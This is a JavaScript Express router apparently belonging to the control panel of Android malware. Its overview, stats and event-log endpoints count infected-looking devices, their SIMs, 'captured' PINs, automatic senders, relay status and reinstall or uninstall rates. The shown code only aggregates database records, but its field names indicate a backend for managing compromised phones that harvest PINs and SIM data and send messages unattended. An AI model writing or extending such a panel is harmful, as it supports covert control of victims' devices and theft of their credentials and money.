"use strict";

const express = require("express");
const { ObjectId } = require("mongodb");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const auth = require("../auth");
const relay = require("../relay");
const { outboxCounters } = require("../routes/devices");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

router.get("/overview", ah(async (req, res) => {
  await auth.requirePanel(req);

  const total = await db.devices.countDocuments({});
  const active = await db.devices.countDocuments({ last_seen: { $gte: new Date(Date.now() - config.ONLINE_WINDOW_SECONDS * 1000) } });
  const gone = await db.devices.countDocuments({ install_state: "gone" });
  const uninstalled = await db.devices.countDocuments({ last_seen: { $lt: new Date(Date.now() - config.STALE_AFTER_DAYS * 86400000) } });

  let sims = 0;
  for await (const d of db.devices.find({}, { projection: { sim_count: 1, "telemetry.sims": 1 } })) {
    sims += d.sim_count || ((d.telemetry || {}).sims || []).length;
  }

  let reinstalls = 0;
  const agg = await db.install_fingerprints.aggregate([{ $group: { _id: null, n: { $sum: { $subtract: ["$install_count", 1] } } } }]).toArray();
  if (agg.length) reinstalls = parseInt(agg[0].n || 0, 10);

  res.json({
    total_devices: total, active_devices: active, offline_devices: Math.max(0, total - active),
    total_sims: sims, pins_captured: await db.devices.countDocuments({ onboarded: true }),
    online_sockets: require("../hub").hub.onlineCount,
    auto_sender_enabled: await db.devices.countDocuments({ "auto_sender.enabled": true }),
    relay_authorized: !!relay.relayState.authorized,
    panel_keys: await db.panel_keys.countDocuments({}),
    installs_total: total, live_now: active, uninstalled, replaced: gone, reinstalls,
  });
}));

router.get("/stats", ah(async (req, res) => {
  await auth.requirePanel(req);

  const now = Date.now();
  const liveCut = new Date(now - config.ONLINE_WINDOW_SECONDS * 1000);
  const idleCut = new Date(now - config.IDLE_AFTER_HOURS * 3600000);
  const staleCut = new Date(now - config.STALE_AFTER_DAYS * 86400000);

  const count = (q) => db.devices.countDocuments(q).catch(() => 0);
  const events = (ev, since) => {
    const q = { event: ev };
    if (since) q.created_at = { $gte: since };
    return db.device_events.countDocuments(q).catch(() => 0);
  };

  const total = await count({});
  const live = await count({ last_seen: { $gte: liveCut } });
  const idle = await count({ last_seen: { $lt: liveCut, $gte: idleCut } });
  const stale = await count({ last_seen: { $lt: idleCut, $gte: staleCut } });
  const uninstalled = await count({ last_seen: { $lt: staleCut } });

  let uniqueDevices = 0, reinstalls = 0;
  try {
    uniqueDevices = (await db.devices.distinct("android_id", { android_id: { $nin: [null, ""] } })).length;
    const agg = await db.install_fingerprints.aggregate([{ $group: { _id: null, n: { $sum: { $subtract: ["$install_count", 1] } } } }]).toArray();
    if (agg.length) reinstalls = parseInt(agg[0].n || 0, 10);
  } catch (_) {}

  const dayAgo = new Date(now - 86400000);
  const weekAgo = new Date(now - 7 * 86400000);

  res.json({
    installs_total: total, unique_devices: uniqueDevices, reinstalls,
    install_events_24h: await events("install", dayAgo),
    install_events_7d: await events("install", weekAgo),
    updates_total: await events("update"), updates_7d: await events("update", weekAgo),
    live, idle, stale, uninstalled,
    replaced: await count({ install_state: "gone" }),
    onboarded: await count({ onboarded: true }),
    retention_pct: total ? Math.round((1000 * live) / total) / 10 : 0,
    uninstall_rate_pct: total ? Math.round((1000 * uninstalled) / total) / 10 : 0,
    outbox: await outboxCounters(),
    generated_at: new Date(now).toISOString(),
  });
}));

router.get("/growth/events", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 80, 10), 300));
  const rows = await db.device_events.find().sort({ _id: -1 }).limit(limit).toArray();

  const out = [];
  for (const r of rows) {
    let d = null;
    if (r.device_id) {
      try { d = await db.devices.findOne({ _id: new ObjectId(r.device_id) }, { projection: { short_id: 1, device_name: 1 } }); }
      catch (_) {}
    }
    out.push({
      id: String(r._id), event: r.event,
      short_id: (d || {}).short_id || "—",
      device_name: r.device_name || (d || {}).device_name || "Unknown",
      app_version: r.app_version || "", android_id: (r.android_id || "").slice(0, 12),
      ts: u.serializeDt(r.created_at),
    });
  }
  res.json({ events: out });
}));

module.exports = router;